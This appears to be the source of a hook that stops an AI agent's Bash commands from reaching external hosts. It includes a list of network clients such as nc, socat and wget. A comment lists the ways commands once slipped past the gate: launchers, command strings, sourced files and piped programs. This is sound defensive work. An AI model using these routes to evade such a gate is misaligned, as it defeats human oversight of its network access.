    // requests.request("GET", url) / urllib3 .request("GET", url): the destination is the 2nd argument.
    if (a?.value !== undefined && /request\s*\(\s*$/.test(m[0]) && /^[A-Z]+$/.test(a.value)) {
      const comma = /^\s*,\s*/.exec(masked.slice(a.next, a.next + 20))
      a = comma ? argAt(orig, masked, a.next + comma[0].length) : null
    }
    if (!a) continue
    let value = a.value ?? bound.get(a.ident)
    if (value === undefined) continue
    // f"{BASE}/x" / `${BASE}/x`: a leading bound name is its value.
    value = value.replace(/^\$?\{([A-Za-z_][A-Za-z0-9_]*)\}/, (all, n) => bound.get(n) ?? all)
    let host = null
    if (SCHEME.test(value)) host = destHost(value)
    else if (HOST_CALLEE.test(m[0]) || (/connect\s*\(\s*$/.test(m[0]) && a.tuple)) host = destHost(value.replace(/:\d+$/, ''))
    if (!host || /[{}$%]/.test(host) || isLocalHost(host)) continue
    hosts.add(host)
  }
  return [...hosts]
}
// Heredoc bodies of the ORIGINAL text, with the offset of their opener. The opener is found in the
// MASKED text (a `<<` inside quotes is not one; `<<<` is a here-string, not a heredoc).
function heredocBodies(orig, masked) {
  const out = []
  const re = /<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/g
  let m
  while ((m = re.exec(masked))) {
    if (masked[m.index - 1] === '<') continue
    const tag = m[1] ?? m[2] ?? m[3]
    const nl = orig.indexOf('\n', m.index + m[0].length)
    if (nl === -1) continue
    const rel = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm').exec(orig.slice(nl + 1))
    if (rel) out.push({ at: m.index, body: orig.slice(nl + 1, nl + 1 + rel.index) })
  }
  return out
}
function readBody(path) {
  try {
    if (!existsSync(path)) return null
    const st = statSync(path)
    if (!st.isFile() || st.size > MAX_BODY_BYTES) return null
    return readFileSync(path, 'utf-8')
  } catch { return null }
}
// What an interpreter runs, from the words after it: { file } a script path (a stdin redirect from a file
// counts), { stdin: true } the code comes from stdin (`-`, or no script word), null not judged (a one-liner,
// a module run, a test runner).
function scriptOf(args, interp) {
  const lang = langOf(interp)
  const codeFlags = BODY_CODE_FLAGS[lang] ?? []
  const valueFlags = BODY_VALUE_FLAGS[lang] ?? []
  let stdinFile = null
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (w === '<') { stdinFile = args[k + 1] ?? null; k++; continue }
    if (/^<[^<&]/.test(w)) { stdinFile = w.slice(1); continue }
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue }
    if (w === '-') return stdinFile ? { file: stdinFile } : { stdin: true }
    if (codeFlags.includes(w) || (lang === 'py' && w === '-m') || /^--test(?:$|[-=])/.test(w)) return null
    if ((BODY_NO_EXEC[lang] ?? []).includes(w) || (lang === 'sh' && /^-[A-Za-z]*n[A-Za-z]*$/.test(w))) return null
    if (w.startsWith('-') || (lang === 'sh' && w.startsWith('+'))) { if (valueFlags.includes(w)) k++; continue }
    if ((interp === 'deno' || interp === 'bun') && w === 'run') continue
    return { file: w }
  }
  return stdinFile ? { file: stdinFile } : { stdin: true }
}
// The written file of `cat > PATH <<TAG` / `cat <<TAG > PATH` / `tee PATH <<TAG` (an append is not tracked).
function writtenPath(argv) {
  const w0 = (argv[0] ?? '').split('/').pop()
  if (w0 === 'tee' && argv.some((w) => w === '-a' || w === '--append')) return null
  for (let k = 1; k < argv.length; k++) {
    const w = argv[k]
    if (w === '>' || w === '>|') return argv[k + 1] ?? null
    if (/^>[^>&|]/.test(w)) return w.slice(1)
    if (w0 === 'tee' && !w.startsWith('-') && !w.startsWith('<')) return w
  }
  return null
}

// --- (e) LAUNCHERS, COMMAND STRINGS, SOURCED FILES, PIPED PROGRAMS, NAMED CLIENTS (c83a6bf6) ---
// The real command word of a sub-command was looked for after a fixed set of prefix words. So a launcher that runs the
// rest of its arguments as a command hid that command when it carried an option with a value, or when the set did not
// name it; a command handed over as a STRING (to a shell, to eval, to a launcher's command option) was never looked at;
// neither was a file read with `source`, a program piped into an interpreter, a project runner, the destination of a
// network client other than curl, a URL passed to judged code through the environment, or a local module that judged
// code imports. The tester measured the forms (card c83a6bf6); they are form classes here, the concrete commands stay
// out of the repository on purpose.
// What the gate does now:
//   - a launcher is skipped with its options (one that takes a value takes the next word, or carries it attached),
//     its operands (a duration, a lock file, a priority) and `--`; launchers chain;
//   - a command string (a shell's -c, eval, a launcher's command option, a launcher that joins its words) is
//     classified as a command of its own, to the depth limit of a substitution;
//   - `source FILE` and `. FILE` judge the file as a shell body;
//   - a program piped into an interpreter that reads it from stdin is the upstream heredoc, file or printed text;
//     when the upstream is none of these, the call is denied: it cannot be judged;
//   - a project runner (uv/poetry/pipenv/pdm/hatch/rye run) is skipped to the interpreter or script it runs;
//   - wget, nc, ncat, netcat, telnet, socat, aria2c and the httpie clients have their destinations read from the argv
//     (the permission deny list names some of them, but it does not look inside a command string);
//   - an external URL assigned in the same command to a name the judged code reads is that code's destination;
//   - a local module the judged code imports (python import, a relative JS import/require) is judged too, to a small
//     depth.
const ASSIGN = /^[A-Za-z_][A-Za-z0-9_]*=/
const LEAD_WORDS = new Set(['do', 'then', 'else', 'elif', '{', '(', '!'])
// value: options whose value is the NEXT word (an attached value, -oL / -n5 / --opt=v, is one word anyway);
// operands: plain words before the command (a duration, a lock file, a priority or CPU mask); string: options whose
// value is a whole command line; join: the remaining words are one command line; none: no command of its own unless
// a string option gives one (the rest of its words are not a command).
export const LAUNCHERS = {
  env: { value: ['-u', '--unset', '-C', '--chdir'], string: ['-S', '--split-string'] },
  sudo: { value: ['-u', '--user', '-g', '--group', '-h', '--host', '-p', '--prompt', '-C', '--close-from', '-D', '--chdir', '-r', '--role', '-t', '--type', '-T', '--command-timeout', '-U', '--other-user'] },
  doas: { value: ['-u', '-C'] },
  nice: { value: ['-n', '--adjustment'] },
  ionice: { value: ['-c', '--class', '-n', '--classdata'] },
  chrt: { value: [], operands: 1 },
  taskset: { value: [], operands: 1 },
  timeout: { value: ['-k', '--kill-after', '-s', '--signal'], operands: 1 },
  stdbuf: { value: ['-i', '--input', '-o', '--output', '-e', '--error'] },
  setsid: { value: [] },
  nohup: { value: [] },
  time: { value: ['-f', '--format', '-o', '--output'] },
  command: { value: [] },
  builtin: { value: [] },
  exec: { value: ['-a'] },
  xargs: { value: ['-a', '--arg-file', '-d', '--delimiter', '-E', '-I', '-L', '-n', '--max-args', '-P', '--max-procs', '-s', '--max-chars', '--process-slot-var'] },
  flock: { value: ['-w', '--timeout', '-E', '--conflict-exit-code'], operands: 1, string: ['-c', '--command'] },
  strace: { value: ['-e', '-o', '-p', '-s', '-u', '-a', '-b', '-I', '-O', '-S', '-X', '-P', '-E'] },
  ltrace: { value: ['-e', '-o', '-p', '-s', '-u', '-a', '-n', '-l', '-w', '-x', '-L'] },
  runuser: { value: ['-u', '--user', '-g', '--group', '-G', '--supp-group', '-s', '--shell', '-w', '--whitelist-environment'], string: ['-c', '--command'] },
  su: { value: ['-g', '--group', '-G', '--supp-group', '-s', '--shell', '-w', '--whitelist-environment'], string: ['-c', '--command'], none: true },
  watch: { value: ['-n', '--interval', '-q', '--equexit'], join: true },
  unbuffer: { value: [] },
  script: { value: ['-E', '--echo', '-o', '--output-limit', '-T', '--log-timing', '-B', '--log-io', '-I', '--log-in', '-O', '--log-out', '-m', '--logging-format'], string: ['-c', '--command'], none: true },
}
// The real command of a sub-command's words: { at, str, viaXargs } -- `at` is the index of the command word (w.length
// when there is none), `str` a command line a launcher runs as a string (classified on its own), else null.
export function unwrapLaunchers(w) {
  let i = 0; let viaXargs = false
  for (;;) {
    while (i < w.length && (ASSIGN.test(w[i]) || LEAD_WORDS.has(w[i]))) i++
    const name = (w[i] ?? '').split('/').pop()
    const spec = Object.hasOwn(LAUNCHERS, name) ? LAUNCHERS[name] : null
    if (!spec) return { at: i, str: null, viaXargs }
    if (name === 'xargs') viaXargs = true
    i++
    let operands = spec.operands ?? 0
    for (; i < w.length; i++) {
      const t = w[i]
      if (t === '--' && !spec.none) { i++; break }
      const sv = (spec.string ?? []).find((f) => t === f || t.startsWith(f + '='))
      if (sv !== undefined) return { at: w.length, str: t === sv ? (w[i + 1] ?? '') : t.slice(sv.length + 1), viaXargs }
      if (t.startsWith('-') && t.length > 1) { if (spec.value.includes(t)) i++; continue }
      if (spec.none) continue
      if (name === 'env' && ASSIGN.test(t)) continue
      if (operands > 0) { operands--; continue }
      break
    }
    if (spec.join) return { at: w.length, str: w.slice(i).join(' ') || null, viaXargs }
    if (spec.none) return { at: w.length, str: null, viaXargs }
  }
}
// A shell's command-string option: -c, or a cluster of short flags that carries c (-lc, -ec).
const SHELL_STRING_FLAG = /^-[A-Za-z]*c[A-Za-z]*$/
const RUNNERS = new Set(['uv', 'poetry', 'pipenv', 'pdm', 'hatch', 'rye'])
const RUNNER_VALUE = new Set(['--with', '--with-requirements', '--python', '-p', '--project', '--directory', '--env-file', '--extra', '--group', '--index', '--default-index', '--index-url', '--extra-index-url', '-e', '--env', '-f', '--find-links', '--package'])
// `<runner> run [options] X ...`: the interpreter X, or the python script X; null when this is not a runner.
function unwrapRunner(word, rest) {
  if (!RUNNERS.has(word) || rest[0] !== 'run') return null
  let k = 1
  while (k < rest.length && rest[k].startsWith('-')) { if (RUNNER_VALUE.has(rest[k])) k++; k++ }
  const target = rest[k]
  if (target === undefined) return null
  const base = target.split('/').pop()
  if (SCRIPT_INTERPRETER.test(base) || SHELL_INTERPRETER.test(base)) return { word: base, rest: rest.slice(k + 1) }
  if (/\.py$/.test(base)) return { word: 'python3', rest: rest.slice(k) }
  return { word: base, rest: rest.slice(k + 1) }
}
export const NET_CLIENTS = new Set(['wget', 'nc', 'ncat', 'netcat', 'telnet', 'socat', 'http', 'https', 'xh', 'aria2c'])
const URL_CLIENT_VALUE = new Set(['-O', '-o', '-a', '-e', '-i', '-P', '-t', '-T', '-w', '-U', '-l', '-A', '-R', '-D', '-Q', '-B', '-d', '-x', '-s', '-j',
  '--header', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '--user', '--password', '--http-user', '--http-password',
  '--referer', '--user-agent', '--output-document', '--output-file', '--append-output', '--directory-prefix', '--tries', '--timeout', '--wait',
  '--level', '--accept', '--reject', '--domains', '--quota', '--base', '--input-file', '--execute', '--load-cookies', '--save-cookies',
  '--auth', '--auth-type', '--session', '--session-read-only', '--output', '--verify', '--cert', '--cert-key', '--proxy', '--dir', '--out'])
const SOCKET_CLIENT_VALUE = new Set(['-p', '-s', '-w', '-x', '-X', '-i', '-q', '-I', '-O', '-T', '-V', '-e', '-c', '-m', '-d', '-o', '-g', '-G',
  '--exec', '--sh-exec', '--lua-exec', '--proxy', '--proxy-type', '--proxy-auth', '--source-port', '--source', '--wait', '--max-conns',
  '--output', '--hex-dump', '--delay'])
// The external destinations of a named client's argv (the words after the client).
export function clientDestinations(cmd, args) {
  const dests = []
  const add = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const socketish = cmd === 'nc' || cmd === 'ncat' || cmd === 'netcat' || cmd === 'telnet'
  if (cmd === 'socat') {
    for (const a of args) {
      const m = /^(?:tcp[46]?|udp[46]?|tcp[46]?-connect|udp[46]?-connect|udp[46]?-sendto|sctp-connect|openssl|openssl-connect|ssl|socks4a?|proxy)[:]([^:,]+)/i.exec(a)
      if (m) add(m[1])
    }
    return dests.filter((h) => !isLocalHost(h))
  }
  // a listener has no outbound destination
  if (socketish && args.some((a) => a === '--listen' || /^-[A-Za-z]*l[A-Za-z]*$/.test(a))) return []
  const value = socketish ? SOCKET_CLIENT_VALUE : URL_CLIENT_VALUE
  let positional = 0
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--') continue
    if (w.startsWith('-') && w.length > 1) { if (value.has(w)) k++; continue }
    if (socketish) { if (positional === 0) add(w); positional++; continue } // host, then the port
    if (cmd === 'http' || cmd === 'https' || cmd === 'xh') {               // [METHOD] URL [items]
      if (positional === 0 && /^[A-Z]+$/.test(w)) continue
      if (positional === 0) add(w.startsWith(':') ? 'localhost' : w)      // `:3000/x` is localhost
      positional++
      continue
    }
    add(w) // wget, aria2c: every positional is a URL
  }
  return dests.filter((h) => !isLocalHost(h))
}
// The local modules judged code imports: python `import a.b` / `from a.b import` resolved under baseDir, a relative
// JS import/require resolved from baseDir. Only files that exist and can be read; [{ body, lang, dir }].
const JS_EXTS = ['', '.js', '.mjs', '.cjs', '.ts', '.mts', '/index.js', '/index.mjs']
function localImports(body, lang, baseDir) {
  const out = []
  if (!baseDir) return out
  if (lang === 'py') {
    for (const m of body.matchAll(/^[ \t]*(?:from[ \t]+([A-Za-z_][\w.]*)[ \t]+import\b|import[ \t]+([A-Za-z_][\w.]*(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*)*))/gm)) {
      const names = m[1] ? [m[1]] : m[2].split(',').map((s) => s.trim())
      for (const name of names) {
        const rel = name.split('.').join('/')
        for (const cand of [join(baseDir, rel + '.py'), join(baseDir, rel, '__init__.py')]) {
          const b = readBody(cand)
          if (b !== null) { out.push({ body: b, lang: 'py', dir: dirname(cand) }); break }
        }
      }
    }
  } else if (lang === 'js') {
    for (const m of body.matchAll(/(?:\bfrom[ \t]*|\bimport[ \t]*\(?[ \t]*|\brequire[ \t]*\([ \t]*)['"](\.{1,2}\/[^'"]+)['"]/g)) {
      for (const ext of JS_EXTS) {
        const cand = resolve(baseDir, m[1] + ext)
        const b = readBody(cand)
        if (b !== null) { out.push({ body: b, lang: 'js', dir: dirname(cand) }); break }
      }
    }
  }
  return out
}
const IMPORT_DEPTH = 2
const IMPORT_FILES = 20
// The external destinations of a code body and of the local modules it imports (to IMPORT_DEPTH, IMPORT_FILES files).
function bodyDestinations(body, lang, baseDir) {
  const hosts = new Set(codeDestinations(body, lang))
  const seen = new Set()
  let layer = [{ body, lang, dir: baseDir }]
  for (let d = 0; d < IMPORT_DEPTH && layer.length && seen.size < IMPORT_FILES; d++) {
    const next = []
    for (const item of layer) {
      for (const mod of localImports(item.body, item.lang, item.dir)) {
        const key = mod.dir + '\0' + mod.body.length + '\0' + mod.body.slice(0, 64)
        if (seen.has(key) || seen.size >= IMPORT_FILES) continue
        seen.add(key)
        for (const h of codeDestinations(mod.body, mod.lang)) hosts.add(h)
        next.push(mod)
      }
    }
    layer = next
  }
  return [...hosts]
}
// The hosts of external URLs assigned in the command to a name the code body reads FROM THE ENVIRONMENT (python
// os.environ / getenv, JS process.env, ruby ENV, perl $ENV{}, php getenv / $_ENV, a shell $NAME). A same-named variable
// of the code itself is not the environment and does not count.
function envUrlDestinations(body, env) {
  const out = []
  for (const [name, value] of Object.entries(env)) {
    if (!isExternal(value)) continue
    const n = name.replace(/[$]/g, '')
    const q = `\\s*['"]${n}['"]`
    const reads = new RegExp(`environ(?:\\.get)?\\s*[\\[(]${q}|getenv\\s*\\(${q}|process\\.env(?:\\.${n}(?![A-Za-z0-9_])|\\s*\\[${q})|\\bENV\\s*\\[${q}|\\$ENV\\{\\s*${n}\\s*\\}|\\$_ENV\\s*\\[${q}|\\$\\{?${n}(?![A-Za-z0-9_])`)
    if (reads.test(body)) out.push(hostOf(value))
  }
  return out.filter(Boolean)
}

export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), ctx = {}) {
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
  const { stripped: orig, inners } = liftSubstitutions(norm)
  if (depth < 4) {
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, ctx); if (r.deny) return r }
  }
  const masked = maskInertLiterals(orig)
  if (masked === null || masked.length !== orig.length) return { deny: false, reason: 'unparseable', hosts: [] }
  const env = { ...(ctx.env ?? {}), ...collectAssignments(orig, masked) }
  const loops = collectLoops(orig, masked, env)
  const docs = heredocBodies(orig, masked)
  const written = new Map() // absolute path -> the heredoc `cat > PATH` wrote earlier in this command
  let cwd = ctx.cwd ?? null
  const absPath = (p) => (/[$`*?]/.test(p) ? null : isAbsolute(p) ? p : cwd ? resolve(cwd, p) : null)
  // The program an interpreter reads from a pipe: the upstream heredoc, the file it cats, or the text it prints;
  // null when it is none of these.
  const pipedProgram = (pa, pb) => {
    const pw = shellWords(expand(orig.slice(pa, pb), env))
    const u = unwrapLaunchers(pw)
    const name = (pw[u.at] ?? '').split('/').pop()
    const args = pw.slice(u.at + 1)
    if (name === 'cat') {
      const doc = docs.find((d) => d.at >= pa && d.at < pb)
      if (doc) return doc.body
      const file = args.find((t) => !t.startsWith('-') && !/^\d*[<>]/.test(t))
      const abs = file ? absPath(file) : null
      return abs ? (written.get(abs) ?? readBody(abs)) : null
    }
    if (name === 'echo' || name === 'printf') return args.filter((t) => !/^-[neE]+$/.test(t)).join(' ')
    return null
  }
  const spanList = spans(masked)
  for (let si = 0; si < spanList.length; si++) {
    const [a, b, op] = spanList[si]
    const prevSpan = si > 0 ? spanList[si - 1] : null
    const mw = words(masked.slice(a, b))
    let i = 0
    while (i < mw.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i]) || PREFIX_WORDS.has(mw[i]))) i++
    if (i >= mw.length) continue
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    const plain = expand(orig.slice(a, b), env)
    const variants = loopVariants(orig.slice(a, b), env, loops)
    // (d) code bodies (see above): `cd`, a heredoc written to a file, an interpreter's heredoc or script.
    const av = shellWords(plain)
    const un = unwrapLaunchers(av)
    if (un.str && depth < 4) {
      const r = classify(un.str, depth + 1, vendorHosts, vendorDomains, { cwd, env })
      if (r.deny) return { deny: true, reason: `wrapped-${r.reason}`, hosts: r.hosts }
    }
    const j = un.at
    const first = av[j] ?? ''
    let word = first.split('/').pop()
    let rest = av.slice(j + 1)
    const run = unwrapRunner(word, rest)
    if (run) { word = run.word; rest = run.rest }
    if (word === 'npx' || word === 'bunx') { // npx [--no-install ...] tsx x.ts
      let k = 0
      while (k < rest.length && rest[k].startsWith('-')) k++
      if (SCRIPT_INTERPRETER.test((rest[k] ?? '').split('/').pop())) { word = rest[k].split('/').pop(); rest = rest.slice(k + 1) }
    }
    if (depth < 4) {
      let str = null; let strKind = null
      if (SHELL_INTERPRETER.test(word)) {
        const k = rest.findIndex((t) => SHELL_STRING_FLAG.test(t))
        if (k !== -1 && rest[k + 1] !== undefined) { str = rest[k + 1]; strKind = 'shell-string' }
      } else if (word === 'eval' && rest.length) { str = rest.join(' '); strKind = 'eval' }
      if (str !== null) {
        const r = classify(str, depth + 1, vendorHosts, vendorDomains, { cwd, env })
        if (r.deny) return { deny: true, reason: `${strKind}-${r.reason}`, hosts: r.hosts }
      }
      if ((word === 'source' || word === '.') && rest[0]) {
        const abs = absPath(rest[0])
        const sbody = abs ? (written.get(abs) ?? readBody(abs)) : null
        if (sbody !== null) {
          const r = classify(sbody, depth + 1, vendorHosts, vendorDomains, { cwd, env })
          if (r.deny) return { deny: true, reason: `sourced-${r.reason}`, hosts: r.hosts }
        }
      }
    }
    const here = docs.find((d) => d.at >= a && d.at < b)
    if (word === 'cd') {
      const dir = rest[0]
      cwd = dir === undefined || dir === '~' ? homedir() : dir === '-' ? null : absPath(dir)
    } else if ((word === 'cat' || word === 'tee') && here) {
      const p = writtenPath([word, ...rest])
      const abs = p ? absPath(p) : null
      if (abs) written.set(abs, here.body)
    } else {
      let body = null; let lang = null; let kind = null; let baseDir = cwd
      if (SCRIPT_INTERPRETER.test(word) || SHELL_INTERPRETER.test(word)) {
        const s = scriptOf(rest, word)
        lang = langOf(word)
        if (s?.stdin && here) { body = here.body; kind = 'heredoc' }
        else if (s?.stdin && op === '|' && prevSpan) {
          body = pipedProgram(prevSpan[0], prevSpan[1]); kind = 'pipe-program'
          if (body === null) return { deny: true, reason: 'pipe-program-unknown', hosts: [] }
        } else if (s?.file) { const abs = absPath(s.file); if (abs) { body = written.get(abs) ?? readBody(abs); kind = 'script-file'; baseDir = dirname(abs) } }
      } else if (first.includes('/')) {
        const abs = absPath(first)
        if (abs) { body = written.get(abs) ?? readBody(abs); lang = body === null ? null : shebangLang(body); kind = 'script-file'; baseDir = dirname(abs) }
      }
      if (body !== null && lang === 'sh') {
        if (depth < 4) {
          const r = classify(body, depth + 1, vendorHosts, vendorDomains, { cwd, env })
          if (r.deny) return { deny: true, reason: `${kind}-${r.reason}`, hosts: r.hosts }
        }
      } else if (body !== null && lang) {
        const hosts = [...new Set([...bodyDestinations(body, lang, baseDir), ...envUrlDestinations(body, env)])]
          .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
        if (hosts.length) return { deny: true, reason: `${kind}-external`, hosts }
      }
    }
    for (const text of [plain, ...(variants ?? [])]) {
      const tw = shellWords(text)
      const tu = unwrapLaunchers(tw)
      const cmd = (tw[tu.at] ?? '').split('/').pop()
      let target = null
      if (cmd === 'curl') target = 'curl'
      else if (NET_CLIENTS.has(cmd)) target = cmd
      else if (INTERPRETER.test(cmd) && tw.slice(tu.at + 1).some((w) => CODE_FLAG.has(w)) && NET_PRIMITIVE.test(text)) target = 'one-liner'
      if (!target) continue
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      if (target === 'curl') found = curlDestinations(tw.slice(tu.at + 1))
      else if (target === 'one-liner') found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      else found = clientDestinations(cmd, tw.slice(tu.at + 1))
      // the arguments xargs feeds from a pipe: the URLs of the upstream command
      if (tu.viaXargs && op === '|' && prevSpan) {
        found = [...found, ...[...orig.slice(prevSpan[0], prevSpan[1]).matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)]
      }
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

const GATE_MSG =
  'Kulso halozati hivas Bash-bol TILTVA (egress hard-gate): curl, wget/nc-szeru kliens, interpreter-egysoros, ' +
  'vagy egy interpreternek adott heredoc / futtatott szkript-fajl halozati hivasa kulso URL-re, akkor is, ha az ' +
  'URL valtozoban van, es akkor is, ha a parancs inditoba, parancs-szovegbe, source-olt fajlba vagy csobe van ' +
  'csomagolva. A localhost/127.0.0.1 hivasok (dashboard) es a helyi halozat ' +
  '(10/8, 172.16/12, 192.168/16, *.local) szabadok. Kulso tartalmat ' +
  'a quarantine-reader sub-ugynokon at kerj le; ha ez egy vendor-API hivas, kerd a fo-agenst.'
function isInvokedDirectly() {
  try { return realpathSync(fileURLToPath(import.meta.url)) === (process.argv[1] ? realpathSync(process.argv[1]) : '') } catch { return false }
}
if (isInvokedDirectly()) {
  let payload
  try { payload = JSON.parse(readFileSync(0, 'utf-8')) } catch { process.exit(0) }
  if (payload?.tool_name !== 'Bash') process.exit(0)
  let r
  try { r = classify(payload?.tool_input?.command, 0, loadVendorHosts(), loadVendorDomains(), { cwd: payload?.cwd || process.cwd() }) } catch (e) { process.stderr.write(`bash-egress-parser: internal error, allowing: ${e?.message}\n`); process.exit(0) }
  if (r.deny) {
    try {
      mkdirSync(dirname(BLOCK_LOG), { recursive: true })
      appendFileSync(BLOCK_LOG, JSON.stringify({ ts: new Date().toISOString(), cwd: process.cwd(), reason: r.reason, hosts: r.hosts }) + '\n')
    } catch { /* the deny still stands; a log failure must not turn it into an allow */ }
    process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: `${GATE_MSG} (hoszt: ${r.hosts.join(', ')})` } }))
  }
  process.exit(0)
}
